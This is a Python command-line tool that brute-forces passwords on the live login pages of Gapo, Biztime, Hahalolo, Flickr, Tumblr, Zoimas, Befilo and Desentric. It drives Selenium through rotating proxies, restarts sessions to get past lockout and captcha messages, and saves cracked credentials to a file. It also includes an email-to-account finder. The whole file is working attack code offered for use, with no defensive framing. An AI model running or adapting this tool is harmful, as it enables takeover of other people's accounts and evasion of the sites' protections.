#!/usr/bin/python
# -*- coding: utf-8 -*-
import threading
from optparse import *
import time
import sys
import io
import os
from GetProxy import getProxies
from Finder import search_social_media_by_gmail
try:
    from selenium import webdriver
except:
    os.system("pip install selenium")
from selenium.webdriver.common.proxy import Proxy, ProxyType
from selenium.webdriver.common.by import By
import selenium.common.exceptions
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.common.keys import Keys
try:
    import requests
except:
    os.system("pip install requests")
try:
    from colorama import Fore, Back, Style
except:
    os.system("pip install colorama")
use = OptionParser("""{}
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░▀▀▄░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█░░░▒▒▒▒▒▒░░░░░░░░▒▒▒░░█░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░█░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█░▄▄▄▒░█▀▀▀▀▄▄█░░░██▄▄█░░░█░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█░▒▄░▀▄▄▄▀░░░░░░░░█░░░▒▒▒▒▒█░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█░░░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█░░██░░▀█▄▄▄█▄▄█▄████░█░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█░░░▀▀▄░█░░░█░███████░█░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▀▄░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▀▄▄░▒▒▒▒░░░░░░░░░░█░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█▀▀▄▄░▒▒▒▒▒▒▒▒▒▒░█░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█░░░░▀▄▄▄▄▄▄▄▄▄▄█░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
{}=========================================================================================
-> --getproxylist                   export_filename (E.x: proxy_list.txt)
-< --loadproxylist                  import_filename
-~ --type_social_media              Type Social media (E.x: gapo or gapo,biztime)
-# --list_password                  List Password BruteForce
-$ --password                       Password BruteForce
-! --gmail                          gmail BruteForce
-% --single_finder                  Single gmail finder
-@ --multi_finder                   Multi gmail finder
-G --gapo                           ACCOUNT gapo
-b --biztime                        ACCOUNT biztime
-H --hahalolo                       ACCOUNT hahalolo
-F --flickr                         ACCOUNT flickr
-T --tumblr                         ACCOUNT tumblr
-Z --zoimas                         ACCOUNT zoimas
-B --befilo                         ACCOUNT befilo
-D --desentric                      ACCOUNT desentric
-h --help                           Show this help message and exit
==========================================================================================
{}""".format(Fore.LIGHTRED_EX, Fore.LIGHTCYAN_EX, Fore.RESET))

use.add_option("->", "--getproxylist", dest="getproxylist",
               help="Export list proxy from website")
use.add_option("-~", "--type_social_media", dest="type",
               help="Type Social Media")
use.add_option("-<", "--loadProxyList", dest="loadproxylist",
               help="Write your list proxy")
use.add_option("-#", "--list_password", dest="list_password",
               help="Write Your list password")
use.add_option("-$", "--password", dest="password",
               help="Write Your password")
use.add_option("-!", "--gmail", dest="gmail",
               help="Write Your Gmail")
use.add_option("-%", "--single_finder", dest="single_finder",
               help="Write your gmail finder")
use.add_option("-@", "--multi_finder", dest="multi_finder",
               help="Write your list gmail finder")
use.add_option("-G", "--gapo)", dest="gapo",
               help="Write Your Account Gapo")
use.add_option("-b", "--biztime", dest="biztime",
               help="Write Your Account Biztime")
use.add_option("-H", "--hahalolo", dest="hahalolo",
               help="Write Your Account Hahalolo")
use.add_option("-F", "--flickr", dest="flickr",
               help="Write Your Account Flickr")
use.add_option("-T", "--tumblr", dest="tumblr",
               help="Write Your Account Tumblr")
use.add_option("-Z", "--zoimas", dest="zoimas",
               help="Write Your Account Zoimas")
use.add_option("-B", "--befilo", dest="befilo",
               help="Write Your Account Befilo")
use.add_option("-D", "--desentric", dest="desentric",
               help="Write Your Account Desentric")

(options, args) = use.parse_args()
url_list = ['https://www.gapo.vn/', 'https://biztime.com.vn/', 'https://accounts.hahalolo.com/sign-in/', 'https://identity.flickr.com/login', 'https://www.tumblr.com/login',
            'https://zoimas.com/welcome/login', 'https://befilo.com/welcome/login', 'https://desentric.com//guest']
social_name = ['gapo', 'biztime', 'hahalolo',
               'flickr', 'tumblr', 'zoimas', 'befilo', 'desentric']
# ===============================Get_Proxy_List============================


def getProxyList():
    getProxies(options.getproxylist, options.type)
# ===================================FINDER================================


def finder():
    try:
        gmail_list = []
        if options.single_finder != None:
            gmail_list.append(options.single_finder)
        if options.multi_finder != None:
            for gm in io.open(options.multi_finder, "r").readlines():
                gmail_list.append(gm.rstrip("\n"))
        if len(gmail_list) == 0:
            print(Fore.LIGHTMAGENTA_EX +
                  "[!] Write your gmail (-%) or list gmail(-@)"+Fore.RESET)
        while len(gmail_list) != 0:
            gm = gmail_list.pop()
            print(Fore.LIGHTCYAN_EX+"Gmail: "+gm+Fore.RESET)
            search_social_media_by_gmail(gm)
    except:
        print(Fore.LIGHTMAGENTA_EX +
              "[!] Write your gmail (-%) or list gmail(-@)"+Fore.RESET)


# =================================LOAD_PROXY==============================
proxy_list = []


def load_proxy_list(socialname):
    while True:
        try:
            proxies = io.open(options.loadproxylist,
                              "r").readlines().pop().split(',')
            for i in range(0, len(proxies)-1):
                element_proxy = proxies[i].split('-')
                if element_proxy[0] == socialname:
                    proxy_list.append(element_proxy[1])
            break
        except:
            print(Fore.LIGHTMAGENTA_EX+"[i] File proxy error"+Fore.RESET)
            time.sleep(10)
# ==============================CHANGE_PROXY===============================


def changeProxy(count_socialname):
    while True:
        if len(proxy_list) == count_socialname[0]:
            proxy_list.clear()
            load_proxy_list(count_socialname[1])
            count_socialname[0] = 0
        try:
            myproxy = proxy_list[count_socialname[0]]
            requests.get(url_list[social_name.index(count_socialname[1])],
                         proxies={'https': myproxy, 'http': myproxy}, timeout=1)
            print(Fore.LIGHTGREEN_EX+"[V]"+"-> "+myproxy+Fore.RESET)
            proxy = Proxy()
            proxy.proxy_type = ProxyType.MANUAL
            proxy.http_proxy = myproxy
            proxy.ssl_proxy = myproxy
            capabilities = webdriver.DesiredCapabilities.FIREFOX
            proxy.add_to_capabilities(capabilities)
            count_socialname[0] += 1
            return capabilities
        except KeyboardInterrupt:
            break
        except requests.exceptions.ConnectionError:
            print(Fore.LIGHTRED_EX+"[X]"+"-> "+myproxy+Fore.RESET)
            count_socialname[0] += 1
            continue
        except:
            print(Fore.LIGHTRED_EX +
                  "[!] Change proxy Error. Again..."+Fore.RESET)


# ==========================LOAD_PASSWORD_LIST=============================
password_list = []


def load_password_list():
    try:
        if options.password != None:
            password_list.append(options.password)
        if options.list_password != None:
            for passwd in io.open(options.list_password, "r").readlines():
                password_list.append(passwd.rstrip("\n"))
        if len(password_list) == 0:
            print(Fore.LIGHTMAGENTA_EX +
                  "[!] Write your password (-$) or list password(-#)"+Fore.RESET)
    except:
        print(Fore.LIGHTMAGENTA_EX +
              "[!] Write your password (-$) or list password(-#)"+Fore.RESET)

# =================================GAPO========================================


def gapo():
    brows = None
    count_while = 0
    count_login = 0
    print("{}Gapo Account: {}{}".format(
        Fore.LIGHTCYAN_EX, options.gapo, Fore.RESET))
    print("{}<<<<<<+++++Start Attacking Gapo+++++>>>>>{}".format(Fore.LIGHTCYAN_EX, Fore.RESET))
    ops = Options()
    if options.gmail != None:
        ops.headless = True
    path = "//div[@id='root']/div[2]/div/div[2]/"
    count_socialname = [0, 'gapo']
    while count_while < len(password_list):
        try:
            password = password_list[count_while]
            if count_login == 0:
                brows = webdriver.Firefox(
                    desired_capabilities=changeProxy(count_socialname), options=ops)
                brows.set_page_load_timeout(30)
                brows.implicitly_wait(5)
                brows.get("https://www.gapo.vn/login")
                send_keys(brows.find_element(
                    By.XPATH, path+"div[3]/input"), options.gapo)
                brows.find_element(By.XPATH, path+"button").click()
                count_login = 1
            print(Fore.LIGHTYELLOW_EX +
                  'Password [==] '+password+Fore.RESET)
            if len(password) < 8 or len(password) > 50:
                count_while += 1
                print(Fore.LIGHTRED_EX+"[!] "+password+Fore.RESET)
                continue
            send_keys(brows.find_element(
                By.XPATH, path+"div[2]/input"), password)
            brows.find_element(By.XPATH, path+"button").click()
            try:
                if brows.find_element(By.XPATH, "//div[@class='modal-body']").text == "Bạn đã đạt giới hạn số lần đăng nhập. Bạn vui lòng thử lại sau!":
                    brows.quit()
                    count_login = 0
                    continue
                brows.find_element(
                    By.XPATH, "//button[@class='btn btn-sm btn-primary']").click()
                brows.find_element(By.XPATH, path+"div[2]/input").clear()
                print(Fore.LIGHTRED_EX+"[X]GAPO "+password+Fore.RESET)
                count_while += 1
                if count_while == len(password_list):
                    brows.quit()
                    break
            except selenium.common.exceptions.NoSuchElementException:
                print("{}[V]GAPO Password Found [{}]{}".format(
                    Fore.LIGHTGREEN_EX, password, Fore.RESET))
                io.open("BruteForce_result.txt", "a").write(
                    "gapo-"+options.gapo+":"+password+"\n")
                brows.quit()
                break
        except (TimeoutException, selenium.common.exceptions.WebDriverException, selenium.common.exceptions.NoSuchWindowException, selenium.common.exceptions.NoSuchElementException):
            print(Fore.LIGHTMAGENTA_EX +
                  '[!]GAPO Brute Force Error!!!. Again'+Fore.RESET)
            brows.quit()
            count_login = 0
            continue
        except:
            print(Fore.LIGHTMAGENTA_EX +
                  '[!]GAPO Brute Fore Stopping...'+Fore.RESET)
            brows.quit()
            break
# =================================BIZTIME=====================================


def biztime():
    count_while = 0
    count_login = 0
    brows = None
    print("{}Biztime Account: {}{}".format(
        Fore.LIGHTCYAN_EX, options.biztime, Fore.RESET))
    print("{}<<<<<<+++++Start Attacking Biztime+++++>>>>>{}".format(Fore.LIGHTCYAN_EX, Fore.RESET))
    ops = Options()
    if options.gmail != None:
        ops.headless = True
    count_socialname = [0, 'biztime']
    while count_while < len(password_list):
        try:
            password = password_list[count_while]
            if count_login == 0:
                brows = webdriver.Firefox(
                    desired_capabilities=changeProxy(count_socialname), options=ops)
                brows.set_page_load_timeout(30)
                brows.implicitly_wait(5)
                brows.get("https://biztime.com.vn/")
                send_keys(brows.find_element(
                    By.NAME, "username"), options.biztime)
                count_login = 1
            print(Fore.LIGHTYELLOW_EX +
                  'Password [==] '+password+Fore.RESET)
            send_keys(brows.find_element(By.NAME, "password"), password)
            brows.find_element(
                By.XPATH, "//button[@class='btn btn-main btn-mat disable_btn tag_wel_btn']").click()
            try:
                brows.implicitly_wait(5)
                brows.find_element(
                    By.XPATH, "//div[@class='valign tag_auth_animation']")
                print("{}[V]BIZTIME Password Found [{}]{}".format(
                    Fore.LIGHTGREEN_EX, password, Fore.RESET))
                io.open("BruteForce_result.txt", "a").write("biztime-" +
                                                            options.biztime+":"+password+"\n")
                brows.quit()
                break
            except:
                if brows.find_element(By.XPATH, "//div[@class='errors']").text == "Tạm khóa 10 phút do bạn đăng nhập sai nhiều lần!":
                    brows.quit()
                    count_login = 0
                    continue
                brows.find_element(By.NAME, "password").clear()
                print(Fore.LIGHTRED_EX+"[X]BIZTIME "+password+Fore.RESET)
                count_while += 1
                if count_while == len(password_list):
                    brows.quit()
                    break
        except (TimeoutException, selenium.common.exceptions.WebDriverException, selenium.common.exceptions.NoSuchWindowException, selenium.common.exceptions.NoSuchElementException):
            print(Fore.LIGHTMAGENTA_EX +
                  '[!]BIZTIME Brute Force Error!!!. Again'+Fore.RESET)
            brows.quit()
            count_login = 0
            continue
        except:
            print(Fore.LIGHTMAGENTA_EX +
                  '[!]BIZTIME Brute Fore Stopping...'+Fore.RESET)
            brows.quit()
            break
# =================================HAHALOLO====================================


def hahalolo():
    brows = None
    count_while = 0
    count_login = 0
    print("{}Hahalolo Account: {}{}".format(
        Fore.LIGHTCYAN_EX, options.hahalolo, Fore.RESET))
    print("{}<<<<<<+++++Start Attacking Hahalolo++++>>>>>{}".format(Fore.LIGHTCYAN_EX, Fore.RESET))
    ops = Options()
    if options.gmail != None:
        ops.headless = True
    count_socialname = [0, 'hahalolo']
    while count_while < len(password_list):
        try:
            password = password_list[count_while]
            if count_login == 0:
                brows = webdriver.Firefox(
                    desired_capabilities=changeProxy(count_socialname), options=ops)
                brows.set_page_load_timeout(30)
                brows.implicitly_wait(5)
                brows.get("https://accounts.hahalolo.com/sign-in/")
                try:
                    send_keys(brows.find_element(
                        By.ID, "accountId"), options.hahalolo)
                except:
                    brows.quit()
                    count_login = 0
                    continue
                count_login = 1
            print(Fore.LIGHTYELLOW_EX +
                  'Password [==] '+password+Fore.RESET)
            send_keys(brows.find_element(By.ID, "password"), password)
            brows.find_element(
                By.XPATH, "//div[@id='app']/div/div/div/div/div[2]/div/div/div/div[2]").click()
            try:
                brows.find_element(By.ID, "captcha-code")
                count_login = 0
                brows.quit()
                continue
            except:
                count_login
            brows.find_element(By.ID, "password").clear()
            print(Fore.LIGHTRED_EX+"[X]HAHALOLO "+password+Fore.RESET)
            count_while += 1
            if count_while == len(password_list):
                brows.quit()
                break
        except selenium.common.exceptions.NoSuchElementException:
            print(
                "{}[V]HAHALOLO Password Found [{}]{}".format(Fore.LIGHTGREEN_EX, password, Fore.RESET))
            io.open("BruteForce_result.txt", "a").write("hahalolo-" +
                                                        options.hahalolo+":"+password+"\n")
            brows.quit()
            break
        except (TimeoutException, selenium.common.exceptions.WebDriverException, selenium.common.exceptions.NoSuchWindowException):
            print(Fore.LIGHTMAGENTA_EX +
                  '[!]HAHALOLO Brute Force Error!!!. Again'+Fore.RESET)
            brows.quit()
            count_login = 0
            continue
        except:
            print(Fore.LIGHTMAGENTA_EX +
                  '[!]HAHALOLO Brute Fore Stopping...'+Fore.RESET)
            brows.quit()
            break
# ================================FLICKR=======================================


def flickr():
    count_while = 0
    count_login = 0
    print("{}Flickr Account: {}".format(Fore.LIGHTCYAN_EX, options.flickr))
    print("{}<<<<<<+++++Start Attacking Flickr++++>>>>>{}".format(Fore.LIGHTCYAN_EX, Fore.RESET))
    ops = Options()
    if options.gmail != None:
        ops.headless = True
    brows = None
    er_id = ""
    count_socialname = [0, 'flickr']
    while count_while < len(password_list):
        try:
            password = password_list[count_while]
            if count_login == 0:
                brows = webdriver.Firefox(
                    desired_capabilities=changeProxy(count_socialname), options=ops)
                brows.set_page_load_timeout(30)
                brows.implicitly_wait(5)
                brows.get("https://identity.flickr.com/login")
                send_keys(brows.find_element(
                    By.XPATH, "//input[@id='login-email']"), options.flickr)
                brows.find_element(
                    By.XPATH, "//form/button").click()
            print(Fore.LIGHTYELLOW_EX +
                  'Password [==] '+password+Fore.RESET)
            send_keys(brows.find_element(
                By.XPATH, "//input[@id='login-password']"), password)
            brows.find_element(
                By.XPATH, "//form/button").click()
            try:
                brows.implicitly_wait(10)
                while True:
                    er_id_new = brows.find_element(By.XPATH, "//form//p").id
                    print(er_id)
                    print(er_id_new)
                    print("========================")
                    if er_id_new != er_id:
                        er_id = er_id_new
                        break
            except selenium.common.exceptions.NoSuchElementException:
                print(
                    "{}[V]FLICKR Password Found [{}]{}".format(Fore.LIGHTGREEN_EX, password, Fore.RESET))
                io.open("BruteForce_result.txt", "a").write("flickr-" +
                                                            options.flickr+":"+password+"\n")
                brows.quit()
                break
            print(Fore.LIGHTRED_EX+"[X]FLICKR "+password+Fore.RESET)
            brows.find_element(
                By.XPATH, "//input[@id='login-password']").send_keys(Keys.SHIFT, Keys.HOME, Keys.BACKSPACE)
            count_login += 1
            if count_login == 4:
                count_login = 0
                brows.quit()
            count_while += 1
            if count_while == len(password_list):
                brows.quit()
                break
        except (TimeoutException, selenium.common.exceptions.WebDriverException, selenium.common.exceptions.NoSuchWindowException, selenium.common.exceptions.NoSuchElementException):
            print(Fore.LIGHTMAGENTA_EX +
                  '[!]FLICKR Brute Force Error!!!. Again'+Fore.RESET)
            brows.quit()
            count_login = 0
            continue
        except Exception as e:
            print(e)
            print(Fore.LIGHTMAGENTA_EX +
                  '[!]FLICKR Brute Fore Stopping...'+Fore.RESET)
            brows.quit()
            break
# ================================TUMBLR=======================================


def tumblr():
    count_while = 0
    count_login = 0
    print("{}Tumblr Account: {}".format(Fore.LIGHTCYAN_EX, options.tumblr))
    print("{}<<<<<<+++++Start Attacking Tumblr++++>>>>>{}".format(Fore.LIGHTCYAN_EX, Fore.RESET))
    ops = Options()
    # if options.gmail != None:
    # ops.headless = True
    brows = None
    count_socialname = [0, 'tumblr']
    while count_while < len(password_list):
        try:
            password = password_list[count_while]
            if count_login == 0:
                brows = webdriver.Firefox(
                    desired_capabilities=changeProxy(count_socialname), options=ops)
                brows.set_page_load_timeout(30)
                brows.implicitly_wait(5)
                brows.get("https://www.tumblr.com/login")
                send_keys(brows.find_element(
                    By.XPATH, "//input[@name='email']"), options.tumblr)
            print(Fore.LIGHTYELLOW_EX +
                  'Password [==] '+password+Fore.RESET)
            send_keys(brows.find_element(
                By.XPATH, "//input[@name='password']"), password)
            brows.find_element(
                By.XPATH, "//form/button").click()
            try:
                t = time.time()
                while brows.find_element(By.XPATH, "//span[@class='EvhBA']").text != "Log in":
                    if time.time() - t > 10:
                        brows.quit()
                        count_login = 0
                        continue
                if brows.find_element(By.XPATH, "//div[@class='oFCPF']").text == "Oops. There was an error. Try again.":
                    count_login = 0
                    brows.quit()
                    continue
                brows.find_element(
                    By.XPATH, "//input[@name='password']").send_keys(Keys.SHIFT, Keys.HOME, Keys.BACKSPACE)
                print(Fore.LIGHTRED_EX+"[X]TUMBLR "+password+Fore.RESET)
                count_login += 1
                if count_login == 5:
                    count_login = 0
                    brows.quit()
                count_while += 1
                if count_while == len(password_list):
                    brows.quit()
                    break
            except selenium.common.exceptions.NoSuchElementException:
                print(
                    "{}[V]TUMBLR Password Found [{}]{}".format(Fore.LIGHTGREEN_EX, password, Fore.RESET))
                io.open("BruteForce_result.txt", "a").write("tumblr-" +
                                                            options.tumblr+":"+password+"\n")
                brows.quit()
                break
        except (TimeoutException, selenium.common.exceptions.WebDriverException, selenium.common.exceptions.NoSuchWindowException, selenium.common.exceptions.NoSuchElementException):
            print(Fore.LIGHTMAGENTA_EX +
                  '[!]TUMBLR Brute Force Error!!!. Again'+Fore.RESET)
            brows.quit()
            count_login = 0
            continue
        except Exception as e:
            print(e)
            print(Fore.LIGHTMAGENTA_EX +
                  '[!]TUMBLR Brute Fore Stopping...'+Fore.RESET)
            brows.quit()
            break
# ================================ZOIMAS=======================================


def zoimas():
    count_while = 0
    count_login = 0
    print("{}Zoimas Account: {}".format(Fore.LIGHTCYAN_EX, options.zoimas))
    print("{}<<<<<<+++++Start Attacking Zoimas++++>>>>>{}".format(Fore.LIGHTCYAN_EX, Fore.RESET))
    ops = Options()
    if options.gmail != None:
        ops.headless = True
    brows = None
    count_socialname = [0, 'zoimas']
    while count_while < len(password_list):
        try:
            password = password_list[count_while]
            if count_login == 0:
                brows = webdriver.Firefox(
                    desired_capabilities=changeProxy(count_socialname), options=ops)
                brows.set_page_load_timeout(30)
                brows.implicitly_wait(5)
                brows.get("https://zoimas.com/welcome/login")
                send_keys(brows.find_element(
                    By.XPATH, "//input[@name='username']"), options.zoimas)
            print(Fore.LIGHTYELLOW_EX +
                  'Password [==] '+password+Fore.RESET)
            send_keys(brows.find_element(
                By.XPATH, "//input[@name='password']"), password)
            brows.find_element(
                By.XPATH, "//button[@class='login-button']").click()
            try:
                brows.find_element(
                    By.XPATH, "//p[normalize-space()='Invalid username or password']")
                print(Fore.LIGHTRED_EX+"[X]ZOIMAS "+password+Fore.RESET)
                brows.find_element(
                    By.XPATH, "//input[@name='password']").clear()
                count_login += 1
                count_while += 1
                if count_while == len(password_list):
                    brows.quit()
                    break
            except selenium.common.exceptions.NoSuchElementException:
                print(
                    "{}[V]ZOIMAS Password Found [{}]{}".format(Fore.LIGHTGREEN_EX, password, Fore.RESET))
                io.open("BruteForce_result.txt", "a").write("zoimas-" +
                                                            options.zoimas+":"+password+"\n")
                brows.quit()
                break
        except (TimeoutException, selenium.common.exceptions.WebDriverException, selenium.common.exceptions.NoSuchWindowException, selenium.common.exceptions.NoSuchElementException):
            print(Fore.LIGHTMAGENTA_EX +
                  '[!]ZOIMAS Brute Force Error!!!. Again'+Fore.RESET)
            brows.quit()
            count_login = 0
            continue
        except:
            print(Fore.LIGHTMAGENTA_EX +
                  '[!]ZOIMAS Brute Fore Stopping...'+Fore.RESET)
            brows.quit()
            break
# ================================BEFILO=======================================


def befilo():
    count_while = 0
    count_login = 0
    print("{}Befilo Account: {}".format(Fore.LIGHTCYAN_EX, options.befilo))
    print("{}<<<<<<+++++Start Attacking Befilo++++>>>>>{}".format(Fore.LIGHTCYAN_EX, Fore.RESET))
    ops = Options()
    if options.gmail != None:
        ops.headless = True
    brows = None
    count_socialname = [0, 'befilo']
    while count_while < len(password_list):
        try:
            password = password_list[count_while]
            if count_login == 0:
                brows = webdriver.Firefox(
                    desired_capabilities=changeProxy(count_socialname), options=ops)
                brows.set_page_load_timeout(30)
                brows.implicitly_wait(5)
                brows.get("https://befilo.com/welcome/login")
                send_keys(brows.find_element(
                    By.XPATH, "//input[@name='username']"), options.befilo)
            print(Fore.LIGHTYELLOW_EX +
                  'Password [==] '+password+Fore.RESET)
            send_keys(brows.find_element(
                By.XPATH, "//input[@name='password']"), password)
            brows.find_element(
                By.XPATH, "//button[@class='login-button']").click()
            try:
                brows.find_element(
                    By.XPATH, "//p[normalize-space()='Invalid username or password']")
                print(Fore.LIGHTRED_EX+"[X]BEFILO "+password+Fore.RESET)
                brows.find_element(
                    By.XPATH, "//input[@name='password']").clear()
                count_login += 1
                # if count_login == 5:
                #     count_login = 0
                #     brows.quit()
                count_while += 1
                if count_while == len(password_list):
                    brows.quit()
                    break
            except selenium.common.exceptions.NoSuchElementException:
                print(
                    "{}[V]BEFILO Password Found [{}]{}".format(Fore.LIGHTGREEN_EX, password, Fore.RESET))
                io.open("BruteForce_result.txt", "a").write("befilo-" +
                                                            options.befilo+":"+password+"\n")
                brows.quit()
                break
        except (TimeoutException, selenium.common.exceptions.WebDriverException, selenium.common.exceptions.NoSuchWindowException, selenium.common.exceptions.NoSuchElementException):
            print(Fore.LIGHTMAGENTA_EX +
                  '[!]BEFILO Brute Force Error!!!. Again'+Fore.RESET)
            brows.quit()
            count_login = 0
            continue
        except:
            print(Fore.LIGHTMAGENTA_EX +
                  '[!]BEFILO Brute Fore Stopping...'+Fore.RESET)
            brows.quit()
            break
# ===============================DESENTRIC======================================


def desentric():
    count_while = 0
    count_login = 0
    print("{}Desentric Account: {}".format(
        Fore.LIGHTCYAN_EX, options.desentric))
    print("{}<<<<<<+++++Start Attacking Desentric++++>>>>>{}".format(Fore.LIGHTCYAN_EX, Fore.RESET))
    ops = Options()
    if options.gmail != None:
        ops.headless = True
    brows = None
    count_socialname = [0, 'desentric']
    while count_while < len(password_list):
        try:
            password = password_list[count_while]
            if count_login == 0:
                brows = webdriver.Firefox(
                    desired_capabilities=changeProxy(count_socialname), options=ops)
                brows.set_page_load_timeout(30)
                brows.implicitly_wait(5)
                brows.get("https://desentric.com//guest")
                try:
                    brows.find_element(By.XPATH, "(//button)[3]/..").click()
                except:
                    print
                time.sleep(1)
                send_keys(brows.find_element(
                    By.XPATH, "//input[@name='email']"), options.desentric)
            print(Fore.LIGHTYELLOW_EX +
                  'Password [==] '+password+Fore.RESET)
            if len(password) < 6 or len(password) > 20:
                print(Fore.LIGHTRED_EX+"[!] "+password+Fore.RESET)
                count_while += 1
                continue
            send_keys(brows.find_element(
                By.XPATH, "//input[@name='password']"), password)
            brows.find_element(
                By.XPATH, "(//button)[2]").click()
            try:
                t = time.time()
                while True:
                    text = brows.find_element(By.XPATH, "(//button)[2]").text
                    if text == "DONE! PLEASE WAIT..":
                        raise selenium.common.exceptions.NoSuchElementException
                    if text == "LOGIN":
                        break
                    if time.time() - t > 10:
                        brows.quit()
                        count_login = 0
                        continue
                brows.find_element(
                    By.XPATH, "//input[@name='password']").send_keys(Keys.SHIFT, Keys.HOME, Keys.BACKSPACE)
                print(Fore.LIGHTRED_EX+"[X]DESENTRIC "+password+Fore.RESET)
                count_login += 1
                # if count_login == 5:
                #     count_login = 0
                #     brows.quit()
                count_while += 1
                if count_while == len(password_list):
                    brows.quit()
                    break
            except selenium.common.exceptions.NoSuchElementException:
                print(
                    "{}[V]DESENTRIC Password Found [{}]{}".format(Fore.LIGHTGREEN_EX, password, Fore.RESET))
                io.open("BruteForce_result.txt", "a").write("desentric-" +
                                                            options.desentric+":"+password+"\n")
                brows.quit()
                break
        except (TimeoutException, selenium.common.exceptions.WebDriverException, selenium.common.exceptions.NoSuchWindowException, selenium.common.exceptions.NoSuchElementException):
            print(Fore.LIGHTMAGENTA_EX +
                  '[!]DESENTRIC Brute Force Error!!!. Again'+Fore.RESET)
            brows.quit()
            count_login = 0
            continue
        except:
            print(Fore.LIGHTMAGENTA_EX +
                  '[!]DESENTRIC Brute Fore Stopping...'+Fore.RESET)
            brows.quit()
            break
# ================================SEND_KEYS====================================


def send_keys(element, key):
    for s in list(key):
        element.send_keys(s)
        time.sleep(0.005/len(key))
# ================================CONTROL======================================


try:
    if options.list_password != None or options.password != None:
        load_password_list()
    check = False
    if options.getproxylist != None:
        getProxyList()
    if options.single_finder != None or options.multi_finder != None:
        finder = threading.Thread(target=finder, name="Finder")
        check = True
        finder.start()
    if options.password != None and options.gmail != None:
        print(Fore.LIGHTCYAN_EX+"CHECK LOGIN WITH GMAIL: " +
              options.gmail+" AND PASSWORD: "+options.password)
        options.biztime = options.gmail
        options.hahalolo = options.gmail
        options.flickr = options.gmail
        options.tumblr = options.gmail
        options.zoimas = options.gmail
        options.befilo = options.gmail
        options.desentric = options.gmail
    if options.gapo != None:
        gapo = threading.Thread(target=gapo, name="Gapo")
        check = True
        gapo.start()
    if options.biztime != None:
        biztime = threading.Thread(target=biztime, name="Biztime")
        check = True
        biztime.start()
    if options.hahalolo != None:
        hahalolo = threading.Thread(
            target=hahalolo, name="Hahalolo")
        check = True
        hahalolo.start()
    if options.flickr != None:
        flickr = threading.Thread(
            target=flickr, name="Flickr")
        check = True
        flickr.start()
    if options.tumblr != None:
        tumblr = threading.Thread(
            target=tumblr, name="Tumblr")
        check = True
        tumblr.start()
    if options.zoimas != None:
        zoimas = threading.Thread(
            target=zoimas, name="Zoimas")
        check = True
        zoimas.start()
    if options.befilo != None:
        befilo = threading.Thread(
            target=befilo, name="Befilo")
        check = True
        befilo.start()
    if options.desentric != None:
        desentric = threading.Thread(
            target=desentric, name="Desentric")
        check = True
        desentric.start()
    if not check:
        print(use.usage)
        exit()
except:
    sys.exit(0)
